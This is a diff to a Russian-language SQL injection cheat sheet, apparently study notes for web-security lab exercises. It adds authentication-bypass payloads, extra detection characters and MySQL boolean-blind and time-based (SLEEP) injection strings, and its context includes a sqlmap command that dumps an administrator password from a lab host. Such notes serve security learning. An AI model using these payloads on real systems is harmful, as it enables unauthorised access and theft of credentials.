@@ -7,7 +7,7 @@ SQL-инъекция - это уязвимость веб-безопасност
 ## Инструменты
 - [sqlmap](https://github.com/sqlmapproject/sqlmap): `sqlmap -u <url> --data <login=1&password=1>`, `sqlmap -u <url> --cookie='id=1; PHPSESSID=abcdef' -p 'id' --param-filter='COOKIE' --skip='PHPSESSID' --level=2` (SQLi в куки `id`)
 ## Обнаружение SQLi
-- Вставка специальных символов в значение параметров: `'`, `"`, `\`
+- Вставка специальных символов в значение параметров: `'`, `"`, `\`, `)`, `')`, `")`
 - Булевы условия: `OR 1=1`, `OR 1=2`
 - Полезные нагрузки, осуществляющие временные задержки
 - Полезные нагрузки OAST (Out-of-Band Application Security Testing), осуществляющие обращение ко внешним ресурсам
@@ -17,7 +17,7 @@ SQL-инъекция - это уязвимость веб-безопасност
 - Оператор `INSERT`: вставляемые значения
 ## Общая информация
 - Внедрение выражения `' or 1=1--` делает следующий SQL-запрос `SELECT <columns> FROM <table_name> WHERE <some_column> = '' or 1=1--`, что приводит к получению значений всех строк из таблицы, так как `1=1` всегда `true`
-- Атакующий может обойти аутентификацию, если SQL-запрос в таблицу с пользователями уязвим. Внедрение `--` после значения логина позволит обойти проверку пароля (`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`). Полезные нагрузки для обхода аутентификации: [Auth_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/10d41d2e7de0de20c424c90ceb118a5993110081/SQL%20Injection/Intruder/Auth_Bypass.txt)
+- Атакующий может обойти аутентификацию, если SQL-запрос в таблицу с пользователями уязвим. Внедрение `--` после значения логина позволит обойти проверку пароля (`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`). Также можно использовать следующие нагрузки: `SELECT * FROM users WHERE login='admin' AND pass='123' OR login='admin' -- -'` (проверка только логина), `SELECT * FROM users WHERE login LIKE 'admin' AND password LIKE '%'` (отправка `%` при использовании оператора `LIKE` приводят к сравнению пароля с любой строкой). Полезные нагрузки для обхода аутентификации: [Auth_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/10d41d2e7de0de20c424c90ceb118a5993110081/SQL%20Injection/Intruder/Auth_Bypass.txt), [Auth_Bypass2.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/10d41d2e7de0de20c424c90ceb118a5993110081/SQL%20Injection/Intruder/Auth_Bypass2.txt)
 - SQLi может быть как в URL параметрах (`https://<url>/filter?Category=<param>`->`SELECT * FROM product WHERE category='<param>')`, так и в куки (`TrackId=<cookie>`-> `SELECT trackId FROM ids where trackId='<cookie>'`)
 - Приложения могут получать информацию в виде JSON, XML, которая далее используется для SQL-запросов. Атакающий может вставить SQLi в JSON, XML и использовать разные кодировки для обхода защиты ([hex/dec-кодировки](https://www.howtocreate.co.uk/sidehtmlentity.html)): 
 ```xml
@@ -50,11 +50,15 @@ SQL-инъекция - это уязвимость веб-безопасност
 ```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a
 ``` 
+Пример SQLi для MySQL (если первый символ - `a`, страница загрузится нормально):
+```SQL
+id=1' AND ASCII(SUBSTRING((SELECT user()),1,1))=97 -- -
+```
 Пример запроса sqlmap (дамп пароля администратора из таблицы `users` схемы `public` через SQLi в куки `TrackingId`): 
 ```bash
 sqlmap -u 'https://0a6c007e03a064fd8180ac2300c60091.web-security-academy.net/' --cookie='TrackingId=RO861hCz137UK4MN; session=6Wx5XJtrM4qzOZTEMFclYvojlja92S3q' -p 'TrackingId' --param-filter='COOKIE' --skip='session' --level=2 --dbms=postgresql -D public -T users -C password --where="username='administrator'" --dump
 ``` 
-#### Blind SQLi на основе временных задержек
+#### Blind SQLi на основе временных задержек (Time-based)
 Атакующий может сделать запрос с условием, где в случае выполнения условия (`true`) будет вызываться временная задержка, при невыполнении условия будет задержки не будет. Из-за задержки в БД HTTP-ответ будет возвращаться так же с задержкой. Данная атака работает, если приложение работает синхронно (т.е.HTTP-ответ приходит после выполнения SQL-запроса).
 Примеры SQLi для MS SQL Server:
 ```sql
@@ -65,6 +69,10 @@ sqlmap -u 'https://0a6c007e03a064fd8180ac2300c60091.web-security-academy.net/' -
 ```
 ```sql
 `'; IF (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1) = 'a') = 1 WAITFOR DELAY '0:0:10'--`
+```
+Пример SQLi для MySQL:
+```SQL
+id=1' AND IF(ASCII(SUBSTRING((SELECT user()),1,1))>97, SLEEP(10),0) -- -
 ```
 #### Blind SQLi с помощью OAST (Out-of-Band Application Security Testing)
 Если приложение работает асинхронно (временные задержки невозможно эксплуатировать), атакующий может заставить БД обращаться ко внешним ресурсам с целью получения информации. Наиболее часто для этого используется протокол DNS. 
